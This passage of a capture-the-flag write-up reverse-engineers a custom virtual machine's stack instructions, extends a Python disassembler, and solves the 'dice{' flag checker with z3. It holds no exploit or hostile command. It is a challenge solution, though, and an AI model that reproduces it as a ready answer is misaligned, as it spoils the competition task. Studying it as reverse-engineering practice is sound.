    <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010405f</span><span class="p">)[</span><span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]]</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010405f</span><span class="p">)[</span><span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]]</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">bVar2</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010405e</span><span class="p">)[</span><span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]]</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010405f</span><span class="p">)[</span><span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010405e</span><span class="p">)[</span><span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]];</span>
    <span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]</span> <span class="o">+=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">bVar2</span> <span class="o">==</span> <span class="mi">7</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">registers</span> <span class="o">+</span> <span class="p">(</span><span class="n">in_RCX</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span> <span class="o">|</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">byte</span><span class="p">)(</span><span class="n">bVar1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)))</span> <span class="o">=</span>
         <span class="p">(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">byte</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_0010405f</span><span class="p">)[</span><span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]];</span>
    <span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]</span> <span class="o">+=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">bVar2</span> <span class="o">==</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3008</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">inst_offet</span> <span class="o">=</span> <span class="n">inst_offet</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>It’s a bit of a mess, but gives a reasonable clue what is going on, remember any operations on <code class="language-plaintext highlighter-rouge">mem</code> you need to multiply by <code class="language-plaintext highlighter-rouge">8</code> to get the real value as we are using <code class="language-plaintext highlighter-rouge">long</code> not the original <code class="language-plaintext highlighter-rouge">byte</code>, it looks like the second nibble of the <code class="language-plaintext highlighter-rouge">printreg</code> instruction defines these other sub instructions.</p>

<p>There appears to be a stack offset which is stored in <code class="language-plaintext highlighter-rouge">mem[1536]</code> (0x2000 in real <code class="language-plaintext highlighter-rouge">mem</code> array) unfortunately the generated code doesn’t identify that <code class="language-plaintext highlighter-rouge">DAT_0010405f</code> is really one below that stack and <code class="language-plaintext highlighter-rouge">DAT_0010405e</code> is two below the stack</p>

<p>Everything works solely on the stack pushing values then do an operation which pops the values and performs them (a different VM, hidding inside the VM)</p>

<table>
  <thead>
    <tr>
      <th>op</th>
      <th>instruction</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0</td>
      <td><code class="language-plaintext highlighter-rouge">ex.push reg</code></td>
    </tr>
    <tr>
      <td>1</td>
      <td><code class="language-plaintext highlighter-rouge">ex.push imm</code></td>
    </tr>
    <tr>
      <td>2</td>
      <td><code class="language-plaintext highlighter-rouge">ex.add</code></td>
    </tr>
    <tr>
      <td>3</td>
      <td><code class="language-plaintext highlighter-rouge">ex.mul</code></td>
    </tr>
    <tr>
      <td>4</td>
      <td><code class="language-plaintext highlighter-rouge">ex.xor</code></td>
    </tr>
    <tr>
      <td>5</td>
      <td><code class="language-plaintext highlighter-rouge">ex.eqz</code></td>
    </tr>
    <tr>
      <td>6</td>
      <td><code class="language-plaintext highlighter-rouge">ex.and</code></td>
    </tr>
    <tr>
      <td>7</td>
      <td><code class="language-plaintext highlighter-rouge">ex.pop reg</code></td>
    </tr>
    <tr>
      <td>8</td>
      <td><code class="language-plaintext highlighter-rouge">ex.reset</code></td>
    </tr>
  </tbody>
</table>

<p>Now that we have these we can ditch the <code class="language-plaintext highlighter-rouge">printreg</code> instruction and add these new instructions.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ExPushReg</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'ExPushReg'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span> <span class="s">'reg'</span><span class="p">])</span>
<span class="n">ExPushImm</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'ExPushImm'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span> <span class="s">'imm'</span><span class="p">])</span>
<span class="n">ExAdd</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'ExAdd'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">])</span>
<span class="n">ExMul</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'ExMul'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">])</span>
<span class="n">ExXor</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'ExXor'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">])</span>
<span class="n">ExEqz</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'ExEqz'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">])</span>
<span class="n">ExAnd</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'ExAnd'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">])</span>
<span class="n">ExPop</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'ExPop'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span> <span class="s">'reg'</span><span class="p">])</span>
<span class="n">ExReset</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'ExReset'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">])</span>
</code></pre></div></div>

<p>Then we adjust the parsing to handle it</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">parse</span><span class="p">(...):</span>
    <span class="p">...</span>
    <span class="n">case</span> <span class="mi">10</span><span class="p">:</span>
        <span class="n">inst</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
        <span class="n">other</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">match</span> <span class="n">inst</span><span class="p">:</span>
            <span class="n">case</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ExPushReg</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">other</span><span class="p">))</span>
            <span class="n">case</span> <span class="mi">1</span><span class="p">:</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ExPushImm</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">other</span><span class="p">))</span>
            <span class="n">case</span> <span class="mi">2</span><span class="p">:</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ExAdd</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
            <span class="n">case</span> <span class="mi">3</span><span class="p">:</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ExMul</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
            <span class="n">case</span> <span class="mi">4</span><span class="p">:</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ExXor</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
            <span class="n">case</span> <span class="mi">5</span><span class="p">:</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ExEqz</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
            <span class="n">case</span> <span class="mi">6</span><span class="p">:</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ExAnd</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
            <span class="n">case</span> <span class="mi">7</span><span class="p">:</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ExPop</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">other</span><span class="p">))</span>
            <span class="n">case</span> <span class="mi">8</span><span class="p">:</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ExReset</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
        <span class="n">offset</span> <span class="o">+=</span> <span class="mi">2</span>
</code></pre></div></div>

<p>Now we just need to print them in the dump</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">case</span> <span class="n">ExPushReg</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">ex.push </span><span class="si">{</span><span class="n">reg_names</span><span class="p">[</span><span class="n">reg</span><span class="p">]</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
    <span class="n">case</span> <span class="n">ExPushImm</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">imm</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">ex.push 0x</span><span class="si">{</span><span class="n">imm</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
    <span class="n">case</span> <span class="n">ExAdd</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">ex.add'</span><span class="p">)</span>
    <span class="n">case</span> <span class="n">ExMul</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">ex.mul'</span><span class="p">)</span>
    <span class="n">case</span> <span class="n">ExXor</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">ex.xor'</span><span class="p">)</span>
    <span class="n">case</span> <span class="n">ExEqz</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">ex.eqz'</span><span class="p">)</span>
    <span class="n">case</span> <span class="n">ExAnd</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">ex.and'</span><span class="p">)</span>
    <span class="n">case</span> <span class="n">ExPop</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">reg</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">ex.pop </span><span class="si">{</span><span class="n">reg_names</span><span class="p">[</span><span class="n">reg</span><span class="p">]</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
    <span class="n">case</span> <span class="n">ExReset</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">ex.reset'</span><span class="p">)</span>
</code></pre></div></div>

<p>Well that was a bit of a side-track discovered, a bunch more instructions getting closer to the finish now.</p>

<p>Let’s keep walking down the child function</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">child_loop:</span> <span class="c1">// was LAB_40b</span>
    <span class="c1">/// Read 8 bytes from the pipe into the rom start</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x0</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2018</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2020</span>
	<span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r11</span><span class="p">,</span> <span class="mh">0x8</span>
	<span class="n">call</span> <span class="n">syscall</span> <span class="p">;</span> <span class="n">SYS_read</span>

    <span class="c1">// Read the pointer/size from the start of the rom</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2020</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">call</span> <span class="n">read_ptr</span>

    <span class="c1">// Read the flag data into the start of the rom</span>
	<span class="n">mov</span> <span class="n">r11</span><span class="p">,</span> <span class="n">r8</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x0</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2018</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2020</span>
	<span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">call</span> <span class="n">syscall</span> <span class="p">;</span> <span class="n">SYS_read</span>

	<span class="n">call</span> <span class="n">check_flag</span> <span class="c1">// was FUNC_557</span>

    <span class="c1">// Write the result of check_flag (r8) into the start of the rom</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">r8</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2020</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">call</span> <span class="n">write_ptr</span>

    <span class="c1">// Write the result back to the parent to read</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x1</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2010</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2020</span>
	<span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r11</span><span class="p">,</span> <span class="mh">0x1</span>
	<span class="n">call</span> <span class="n">syscall</span> <span class="p">;</span> <span class="n">SYS_write</span>

	<span class="n">jump</span> <span class="n">child_loop</span>
</code></pre></div></div>

<p>Now the real part where we want to look <code class="language-plaintext highlighter-rouge">check_flag</code></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">check_flag:</span>
    <span class="c1">// Check if the rom (flag input) starts with 'dice{'</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x0</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="n">rom</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0xffffffffff</span>
	<span class="n">and</span> <span class="n">r8</span><span class="p">,</span> <span class="n">r0</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x7b65636964</span> <span class="c1">// '{ecid'</span>
	<span class="n">jumpeq</span> <span class="n">r8</span><span class="p">,</span> <span class="n">r0</span><span class="p">,</span> <span class="n">LAB_589</span>

	<span class="n">jump</span> <span class="n">LAB_1da6</span>

<span class="n">LAB_589</span><span class="o">:</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">reset</span>
    <span class="c1">// Load flag offsets</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x7</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="n">rom</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x1</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">rom</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x11</span>
	<span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="n">rom</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0xf</span>
	<span class="n">mov</span> <span class="n">r11</span><span class="p">,</span> <span class="n">rom</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>

    <span class="c1">// Add (can be another op) the first two values</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">push</span> <span class="n">r8</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">push</span> <span class="n">r9</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">add</span>

    <span class="c1">// Add (can be another op) the last result to 0x2c</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">push</span> <span class="mh">0x2c</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">add</span>

    <span class="c1">// Add (can be another op) the second two values</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">push</span> <span class="n">r10</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">push</span> <span class="n">r11</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">add</span>

    <span class="c1">// Xor (can be another op) the last result and 0xd8</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">push</span> <span class="mh">0xd8</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">xor</span>

    <span class="c1">// Xor the last two groups of operations</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">xor</span>

    <span class="c1">// Xor the result of the last operation with 0xd8</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">push</span> <span class="mh">0x10</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">xor</span>

    <span class="c1">// Xor the result of that again</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">push</span> <span class="mh">0xd6</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">xor</span>

    <span class="c1">// Check if it's equal to zero (this only happens if it equals 0xd6)</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">eqz</span>
<span class="p">...</span> <span class="c1">// slightly different ops, constants and offsets in mem provided and repeated multiple times</span>

	<span class="n">ex</span><span class="p">.</span><span class="n">and</span> <span class="c1">// Combine the result of the final eqz operations</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">and</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">and</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">and</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">and</span>
<span class="p">...</span> <span class="c1">// repeated and for each block</span>
	<span class="n">ex</span><span class="p">.</span><span class="n">pop</span> <span class="n">r8</span> <span class="c1">// Return the result as r8</span>
	<span class="n">jump</span> <span class="n">LAB_1daf</span>

<span class="n">LAB_1da6</span><span class="o">:</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x0</span>
<span class="n">LAB_1daf</span><span class="o">:</span>
	<span class="n">ret</span>
</code></pre></div></div>

<h2 id="solving-the-flag-checker">Solving the flag checker</h2>

<p>Now we can build another matcher which is able extract all these patterns and then use z3 to be able to solve what matches all these operations.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">solve</span><span class="p">(</span><span class="n">instructions</span><span class="p">):</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="p">[</span><span class="n">BitVec</span><span class="p">(</span><span class="s">'f%d'</span> <span class="o">%</span> <span class="n">i</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">)]</span>
    <span class="k">def</span> <span class="nf">do_op</span><span class="p">(</span><span class="n">op</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
        <span class="n">match</span> <span class="n">op</span><span class="p">:</span>
            <span class="n">case</span> <span class="n">ExAdd</span><span class="p">():</span>
                <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span>
            <span class="n">case</span> <span class="n">ExMul</span><span class="p">():</span>
                <span class="k">return</span> <span class="n">a</span> <span class="o">*</span> <span class="n">b</span>
            <span class="n">case</span> <span class="n">ExXor</span><span class="p">():</span>
                <span class="k">return</span> <span class="n">a</span> <span class="o">^</span> <span class="n">b</span>
            <span class="n">case</span> <span class="n">ExAnd</span><span class="p">():</span>
                <span class="k">return</span> <span class="n">a</span> <span class="o">&amp;</span> <span class="n">b</span>
            <span class="n">case</span> <span class="n">_</span><span class="p">:</span>
                <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">'Unexpected operation'</span><span class="p">)</span>

    <span class="n">ops</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">instructions</span><span class="p">):</span>
        <span class="n">match</span> <span class="n">instructions</span><span class="p">[</span><span class="n">idx</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">24</span><span class="p">]:</span>
            <span class="n">case</span> <span class="p">[</span><span class="n">MovImm</span><span class="p">(</span><span class="n">imm</span><span class="o">=</span><span class="n">a</span><span class="p">),</span> <span class="n">RomLoad</span><span class="p">(),</span> <span class="n">MovImm</span><span class="p">(</span><span class="n">imm</span><span class="o">=</span><span class="n">b</span><span class="p">),</span> <span class="n">RomLoad</span><span class="p">(),</span>
                  <span class="n">MovImm</span><span class="p">(</span><span class="n">imm</span><span class="o">=</span><span class="n">c</span><span class="p">),</span> <span class="n">RomLoad</span><span class="p">(),</span> <span class="n">MovImm</span><span class="p">(</span><span class="n">imm</span><span class="o">=</span><span class="n">d</span><span class="p">),</span> <span class="n">RomLoad</span><span class="p">(),</span>
                  <span class="n">ExPushReg</span><span class="p">(),</span> <span class="n">ExPushReg</span><span class="p">(),</span>
                  <span class="p">(</span><span class="n">ExAdd</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExMul</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExXor</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExAnd</span><span class="p">())</span> <span class="k">as</span> <span class="n">op0</span><span class="p">,</span>
                  <span class="n">ExPushImm</span><span class="p">(</span><span class="n">imm</span><span class="o">=</span><span class="n">r0</span><span class="p">),</span>
                  <span class="p">(</span><span class="n">ExAdd</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExMul</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExXor</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExAnd</span><span class="p">())</span> <span class="k">as</span> <span class="n">op1</span><span class="p">,</span>
                  
                  <span class="n">ExPushReg</span><span class="p">(),</span> <span class="n">ExPushReg</span><span class="p">(),</span>
                  <span class="p">(</span><span class="n">ExAdd</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExMul</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExXor</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExAnd</span><span class="p">())</span> <span class="k">as</span> <span class="n">op2</span><span class="p">,</span>
                  <span class="n">ExPushImm</span><span class="p">(</span><span class="n">imm</span><span class="o">=</span><span class="n">r1</span><span class="p">),</span>
                  <span class="p">(</span><span class="n">ExAdd</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExMul</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExXor</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExAnd</span><span class="p">())</span> <span class="k">as</span> <span class="n">op3</span><span class="p">,</span>
                  
                  <span class="p">(</span><span class="n">ExAdd</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExMul</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExXor</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExAnd</span><span class="p">())</span> <span class="k">as</span> <span class="n">op4</span><span class="p">,</span>
                  <span class="n">ExPushImm</span><span class="p">(</span><span class="n">imm</span><span class="o">=</span><span class="n">r2</span><span class="p">),</span>
                  <span class="p">(</span><span class="n">ExAdd</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExMul</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExXor</span><span class="p">()</span> <span class="o">|</span> <span class="n">ExAnd</span><span class="p">())</span> <span class="k">as</span> <span class="n">op5</span><span class="p">,</span>
                  
                  <span class="n">ExPushImm</span><span class="p">(</span><span class="n">imm</span><span class="o">=</span><span class="n">expected</span><span class="p">),</span>
                  <span class="n">ExXor</span><span class="p">(),</span>
                  <span class="n">ExEqz</span><span class="p">(),</span>
                  <span class="p">]:</span>
                
                <span class="n">result1</span> <span class="o">=</span> <span class="n">do_op</span><span class="p">(</span><span class="n">op0</span><span class="p">,</span> <span class="n">flag</span><span class="p">[</span><span class="n">a</span><span class="p">],</span> <span class="n">flag</span><span class="p">[</span><span class="n">b</span><span class="p">])</span>
                <span class="n">result1</span> <span class="o">=</span> <span class="n">do_op</span><span class="p">(</span><span class="n">op1</span><span class="p">,</span> <span class="n">result1</span><span class="p">,</span> <span class="n">r0</span><span class="p">)</span>
                <span class="n">result2</span> <span class="o">=</span> <span class="n">do_op</span><span class="p">(</span><span class="n">op2</span><span class="p">,</span> <span class="n">flag</span><span class="p">[</span><span class="n">c</span><span class="p">],</span> <span class="n">flag</span><span class="p">[</span><span class="n">d</span><span class="p">])</span>
                <span class="n">result2</span> <span class="o">=</span> <span class="n">do_op</span><span class="p">(</span><span class="n">op3</span><span class="p">,</span> <span class="n">result2</span><span class="p">,</span> <span class="n">r1</span><span class="p">)</span>
                <span class="n">result</span> <span class="o">=</span> <span class="n">do_op</span><span class="p">(</span><span class="n">op4</span><span class="p">,</span> <span class="n">result1</span><span class="p">,</span> <span class="n">result2</span><span class="p">)</span>
                <span class="n">result</span> <span class="o">=</span> <span class="n">do_op</span><span class="p">(</span><span class="n">op5</span><span class="p">,</span> <span class="n">result</span><span class="p">,</span> <span class="n">r2</span><span class="p">)</span>
                
                <span class="n">ops</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="n">expected</span><span class="p">)</span>

        <span class="n">idx</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
    <span class="n">s</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">z3</span><span class="p">.</span><span class="n">And</span><span class="p">(</span><span class="n">ops</span><span class="p">))</span>
    <span class="k">assert</span> <span class="n">s</span><span class="p">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">model</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">([</span><span class="n">m</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">as_long</span><span class="p">()</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">flag</span> <span class="k">if</span> <span class="n">m</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">]),</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
</code></pre></div></div>

